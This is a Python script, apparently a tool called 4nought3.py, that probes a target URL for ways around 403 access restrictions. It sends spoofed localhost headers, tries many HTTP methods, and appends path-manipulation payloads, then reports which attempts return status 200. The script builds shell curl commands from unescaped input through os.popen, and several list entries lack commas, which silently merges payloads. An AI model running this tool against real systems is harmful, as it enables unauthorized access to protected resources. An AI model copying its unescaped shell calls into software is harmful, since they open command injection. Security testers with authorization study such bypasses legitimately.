#!/usr/bin/python
import os
import sys
from core import httptypes


def host_header_injection(header, defined_url):
	command = os.popen("curl -k -s -I -X GET -H \"%s\" %s" % (header, defined_url))
	try:
		status = command.read().strip().split(" ")[1]
	except:
		status = '404'
	# httptype = httptypes.httpcode(status)
	# print(httptype)
	if int(status) == 200:
		return "%s --> \033[1;32;40m%s\033[0m" % (header, status)
	else:
		return "%s --> \033[1;31;40m%s\033[0m" % (header, status)


def http_methods(method, defined_url):
	command = os.popen("curl -k -s -I -X %s %s" % (method, defined_url))
	try:
		status = command.read().strip().split(" ")[1]
	except:
		status = '404'
	# httptype = httptypes.httpcode(status)
	# print(httptype)
	if int(status) == 200:
		return "%s --> \033[1;32;40m%s\033[0m" % (method, status)
	else:
		return "%s --> \033[1;31;40m%s\033[0m" % (method, status)


def url_injection(payload, defined_url):
	uri = defined_url.split("/")[-1]
	uri = "/" + uri
	remaining_url = defined_url.replace(uri, "")
	payload_url = remaining_url + payload + uri
	command = os.popen("curl -k -s -I '%s'" % payload_url)
	try:
		status = command.read().strip().split(" ")[1]
	except:
		status = '404'
	# httptype = httptypes.httpcode(status)
	# print(httptype)
	if int(status) == 200:
		return "%s --> \033[1;32;40m%s\033[0m" % (payload_url, status)
	else:
		return "%s --> \033[1;31;40m%s\033[0m" % (payload_url, status)


def url_end_injection(payload, defined_url):
	payload_url = defined_url + payload
	command = os.popen("curl -k -s -I '%s'" % payload_url)
	try:
		status = command.read().strip().split(" ")[1]
	except:
		status = '404'
	if int(status) == 200:
		return "%s --> \033[1;32;40m%s\033[0m" % (payload_url, status)
	else:
		return "%s --> \033[1;31;40m%s\033[0m" % (payload_url, status)


if len(sys.argv) != 2:
	print("\033[1;31;40mSyntax error: \033[1;32;40muse \"python 4nought3.py url\"")
else:
	url = sys.argv[1]
	# //////////////////////HOST HEADER INJECTIONS////////////////////////
	headerinjections = [
		"Client-IP: 127.0.0.1",
		"Redirect: 127.0.0.1",
		"Referer: 127.0.0.1",
		"X-Client-IP: 127.0.0.1"
		"X-Client-IP: 127.0.0.1",
		"X-Custom-IP-Authorization: 127.0.0.1",
		"X-Forwarded-By: 127.0.0.1",
		"X-Forwarded-For: 127.0.0.1",
		"X-Forwarded-Host: 127.0.0.1"
		"X-Forwarded-Host: 127.0.0.1",
		"X-Forwarded-Port: 80",
		"X-Host: 127.0.0.1",
		"X-Originating-IP: 127.0.0.1",
		"X-Real-Ip: 127.0.0.1",
		"X-Remote-IP: 127.0.0.1",
		"X-True-IP: 127.0.0.1",
		"X-Forwarded-For: 127.0.0.1"
	]

	print("[+]Trying Host Header Injections:")
	for hi in headerinjections:
		try:
			print(host_header_injection(hi, url))
		except:
			pass
	# //////////////////////POTENTIAL METHODS////////////////////////////
	print("[+]Trying all the potential HTTP methods")
	httpmeths = [
		"GET",
		"ACL"
		"ARBITRARY",
		"BASELINE-CONTROL",
		"CHECKOUT",
		"CONNECT",
		"COPY",
		"HEAD",
		"LABEL",
		"MERGE",
		"MOVE",
		"OPTIONS",
		"PATCH",
		"PUT",
		"SEARCH",
		"TRACE",
		"UNCHECKOUT",
		"UNLOCK",
		"UPDATE",
		"POST"]
	# A = http_methods()
	for hm in httpmeths:
		try:
			print(http_methods(hm, url))
		except:
			pass
	# /////////////////////URL Injections//////////////////////////
	print("[+]Trying url injections")
	urlinj = ["/;",
	          "//",
	          "/.;",
	          "/%2e",
	          "/.;/:",
	          "/;foo=bar",
	          "/;foo=bar;"]
	for ui in urlinj:
		print(url_injection(ui,url))

	urlendinj = ["%20/",
	             "/%09/",
	             "/%2e/",
	             "/.",
	             "//",
	             "/abcde/",
	             "/.abcde/",
	             "//?abcde/",
	             "/..;:/"]

	for uei in urlendinj:
		print(url_end_injection(uei,url))
